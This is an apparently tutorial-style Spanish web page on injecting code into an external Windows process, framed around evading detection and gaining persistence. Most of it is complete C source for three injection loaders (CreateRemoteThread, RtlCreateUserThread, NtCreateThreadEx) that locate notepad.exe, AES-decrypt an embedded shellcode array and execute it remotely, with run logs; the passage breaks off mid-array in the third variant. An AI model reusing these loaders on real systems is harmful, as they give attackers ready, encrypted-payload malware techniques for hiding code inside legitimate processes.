---
layout: default
---

## Inyección en proceso externo

En ocasiones, por diferentes motivos los atacantes tratan de comprometer un proceso externo al binario malicioso en el sistema operativo en el que se ejecuta.
Los motivos pueden ser:
- Evasión: desviar la actividad maliciosa del binario que la  provoco es una técnica efectiva que solo puede ser detectada con telemetría a bajo nivel sobre el sistema opertivo en el que se ejecutó.
- Persistencia: tras la ejecución del proceso malicioso en el sistema opertivo, en muchos casos es necesario dejar una vía de comunicación constante desde una proceso que no finilace en el propio sistema comprometido.

### Diagrama asociado a la inyección

![Inyección en proceso externo](/assets/images/external_process_injection.png)

### Pseudo-codigo

```c
// 1. Tras buscar el pid del proceso externo se revisan los privilegios y se abre
hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)

// 2. Se reserva memoria en el context del proceso externo
pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. Escritura en el buffer de memoria reservado para el proceso externo
WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. Ejecución de un hilo en el proceso externo para que ejecute el código escrito en el buffer
CreateRemoteThread(hRemoteProcess,..., pRemoteCode, ...)      // Opción1: API clasica
RtlCreateUserThread(hRemoteProcess, ..., pRemoteCode, ..., &hThread, ...)    // Opción2: librería ntdll.dll
NtCreateThreadEx(&hThread,..., hRemoteProcess, pRemoteCode,...)        // Opción3: librería ntdll.dll
```
### Código fuente 

Siguiendo el pseudo-codigo extisten diferentes formas de realizar la misma inyección:

#### CreateRemoteThread()

Inyección del tipo 1 desde un binario: CreateRemoteThread
```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido
                
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("Process Found!\n");
                        break;
                }
        }
                
        CloseHandle(hProcSnap); //se cierra el snapshot
                
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	// Inyección tipo 1
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}



int main(void) {
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}

```
Salida de la ejecución:

```
external_injection_exe.exe
[FindProcess: ] System
[FindProcess: ] Registry
[FindProcess: ] smss.exe
[FindProcess: ] csrss.exe
[FindProcess: ] wininit.exe
[FindProcess: ] csrss.exe
[FindProcess: ] winlogon.exe
[FindProcess: ] services.exe
[FindProcess: ] lsass.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dwm.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] Memory Compression
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] spoolsv.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ruby.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] wlms.exe
[FindProcess: ] svchost.exe
[FindProcess: ] MsMpEng.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sppsvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SppExtComObj.Exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] NisSrv.exe
[FindProcess: ] sihost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] taskhostw.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ctfmon.exe
[FindProcess: ] svchost.exe
[FindProcess: ] explorer.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ShellExperienceHost.exe
[FindProcess: ] SearchUI.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] YourPhone.exe
[FindProcess: ] SkypeApp.exe
[FindProcess: ] SkypeBackgroundHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SearchIndexer.exe
[FindProcess: ] smartscreen.exe
[FindProcess: ] cmd.exe
[FindProcess: ] conhost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SecurityHealthSystray.exe
[FindProcess: ] SecurityHealthService.exe
[FindProcess: ] VBoxTray.exe
[FindProcess: ] WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
[FindProcess: ] OneDrive.exe
[FindProcess: ] svchost.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad++.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ApplicationFrameHost.exe
[FindProcess: ] WinStore.App.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SystemSettings.exe
[FindProcess: ] SgrmBroker.exe
[FindProcess: ] uhssvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WmiPrvSE.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad.exe
Process Found!
Notepad.exe PID = 2820
```

Evidencia de la inyección:

![inyección_proceso_externo](/assets/images/inyeccion_proceso_externo.png)


#### pRtlCreateUserThread()

Inyección del tipo 2 desde un binario: pRtlCreateUserThread
```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
unsigned int payload_len = sizeof(payload);
char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindProcess(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//se crear un snapshot de los procesos en ejecución del sistema operativo
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); // se obtiene el tamaño total del objeo definido
                
        if (!Process32First(hProcSnap, &pe32)) { // validación del snapshot creado
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) { // iteración del snapshot
				printf("[FindProcess: ] %s \n", pe32.szExeFile);
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) { // comprobación del nombre del proceso
                        pid = pe32.th32ProcessID; // obtención del pid del proceso
						printf("Process Found!\n");
                        break;
                }
        }
                
        CloseHandle(hProcSnap); //se cierra el snapshot
                
        return pid; // retorno de pid
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
	// Inyeccion tipo2 pRtlCreateUserThread
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	// Inyeccion tipo2 pRtlCreateUserThread
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}



int main(void) {
	int pid = 0;
    HANDLE hProc = NULL;
	pid = FindProcess("notepad.exe");
	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}

```
Salida de la ejecución:

```
external_injection_exe_2.exe
[FindProcess: ] System
[FindProcess: ] Registry
[FindProcess: ] smss.exe
[FindProcess: ] csrss.exe
[FindProcess: ] wininit.exe
[FindProcess: ] csrss.exe
[FindProcess: ] winlogon.exe
[FindProcess: ] services.exe
[FindProcess: ] lsass.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dwm.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] Memory Compression
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] spoolsv.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ruby.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] wlms.exe
[FindProcess: ] svchost.exe
[FindProcess: ] MsMpEng.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sppsvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SppExtComObj.Exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sihost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] taskhostw.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ctfmon.exe
[FindProcess: ] svchost.exe
[FindProcess: ] explorer.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ShellExperienceHost.exe
[FindProcess: ] SearchUI.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] YourPhone.exe
[FindProcess: ] SkypeApp.exe
[FindProcess: ] SkypeBackgroundHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SearchIndexer.exe
[FindProcess: ] smartscreen.exe
[FindProcess: ] cmd.exe
[FindProcess: ] conhost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SecurityHealthSystray.exe
[FindProcess: ] SecurityHealthService.exe
[FindProcess: ] VBoxTray.exe
[FindProcess: ] WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
[FindProcess: ] OneDrive.exe
[FindProcess: ] svchost.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad++.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ApplicationFrameHost.exe
[FindProcess: ] WinStore.App.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SystemSettings.exe
[FindProcess: ] SgrmBroker.exe
[FindProcess: ] uhssvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WmiPrvSE.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dllhost.exe
[FindProcess: ] ProcessHacker.exe
[FindProcess: ] Microsoft.Photos.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] dllhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad.exe
Process Found!
Notepad.exe PID = 2960
```

Evidencia de la inyección:

![inyección_proceso_externo](/assets/images/inyeccion_proceso_externo_2.png)

#### pNtCreateThreadEx()

Inyección del tipo 3 desde un binario: pNtCreateThreadEx
```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// calc.exe
unsigned char payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 